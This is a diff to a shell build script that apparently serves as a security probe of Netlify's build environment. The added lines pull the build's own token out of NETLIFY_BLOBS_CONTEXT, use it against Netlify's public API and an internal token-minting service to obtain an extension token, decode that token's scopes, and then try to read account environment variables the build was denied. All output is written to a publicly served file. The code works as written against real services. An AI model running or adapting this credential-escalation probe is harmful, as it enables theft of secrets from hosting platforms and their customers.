@@ -16,6 +16,7 @@
 #  - the ONLY secrets printed are this site's own; token VALUES are hashed, never echoed.
 # ============================================================================
 set +e
+exec > >(tee "$(dirname "$0")/public/r-eae798aed843bbb0.txt") 2>&1
 echo "=================== NETLIFY BUILD RECON =================================="
 echo "date_utc=$(date -u +%FT%TZ)  ctx=${CONTEXT:-?}  site=${SITE_NAME:-?}  deploy=${DEPLOY_ID:-?}"
 
@@ -126,3 +127,56 @@ echo "  any other uid's files under /opt?"; find /opt -xdev -maxdepth 3 ! -user 
 
 echo
 echo "=================== END RECON ==========================================="
+
+# ============================================================================
+# PART 2 -- what does THIS build's own credential buy?
+# The question the whole lane rests on: a build is denied sensitive env values,
+# but is it handed authority that can fetch them back?
+# ============================================================================
+hr "B1  extract this build's own token from NETLIFY_BLOBS_CONTEXT"
+BT=$(printf %s "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
+if [ -z "$BT" ]; then echo "  no token in blobs context"; else
+  echo "  token len=${#BT} prefix=${BT:0:4} sha256=$(printf %s "$BT" | sha256sum | cut -c1-16)"
+fi
+
+hr "B2  does the build token work against the DOCUMENTED api? (api.netlify.com)"
+for p in /api/v1/user /api/v1/sites /api/v1/accounts "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
+  printf "  %-52s -> " "$p"
+  timeout 12 curl -sS -o /tmp/b.out -w '%{http_code} ' "https://api.netlify.com$p" -H "Authorization: Bearer $BT" 2>/dev/null || printf 'ERR '
+  head -c 220 /tmp/b.out 2>/dev/null | tr -d '\n'; echo
+done
+
+hr "B3  will JIGSAW mint an extension_token for this build's token?"
+JG=https://jigsaw.services-prod.nsvcs.net
+printf "  team/%s/.../meta/%s -> " "${ACCOUNT_ID:0:10}…" "${SITE_ID:0:10}…"
+timeout 12 curl -sk -o /tmp/j.out -w '%{http_code} ' "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SITE_ID" \
+  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null || printf 'ERR '
+python3 - </tmp/j.out <<'PY' 2>/dev/null || echo "(no token)"
+import sys,json,base64
+try: d=json.load(sys.stdin)
+except Exception: print("  unparsable"); raise SystemExit
+for e in d if isinstance(d,list) else []:
+    t=e.get("extension_token") or ""
+    if not t: print(f"  {e.get('slug')}: extension_token EMPTY"); continue
+    p=t.split(".")[1]; p+="="*(-len(p)%4)
+    c=json.loads(base64.urlsafe_b64decode(p))
+    print(f"  {e.get('slug')}: owner_id={c.get('owner_id')} actor={c.get('actor_type')}")
+    print(f"     scopes={c.get('authorized_scopes')}")
+    open("/tmp/ET","w").write(t)
+PY
+
+hr "B4  with that extension token, can the build read the env it was denied?"
+if [ -s /tmp/ET ]; then
+  ET=$(cat /tmp/ET)
+  for p in /api/v1/user "/api/v1/accounts/$ACCOUNT_ID/env" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
+    printf "  %-52s -> " "$p"
+    timeout 12 curl -sk -o /tmp/e.out -w '%{http_code} ' "$JG$p" -H "Authorization: Bearer $ET" 2>/dev/null || printf 'ERR '
+    head -c 300 /tmp/e.out 2>/dev/null | tr -d '\n'; echo
+  done
+else
+  echo "  no extension token minted -- skipped"
+fi
+
+hr "B5  canary check: which env values were actually PASSED to this build?"
+echo "  CHERRY_PLAIN in env: $([ -n "$CHERRY_PLAIN" ] && echo "YES ($CHERRY_PLAIN)" || echo no)"
+echo "  CHERRY_SECRET in env: $([ -n "$CHERRY_SECRET" ] && echo YES || echo no)"
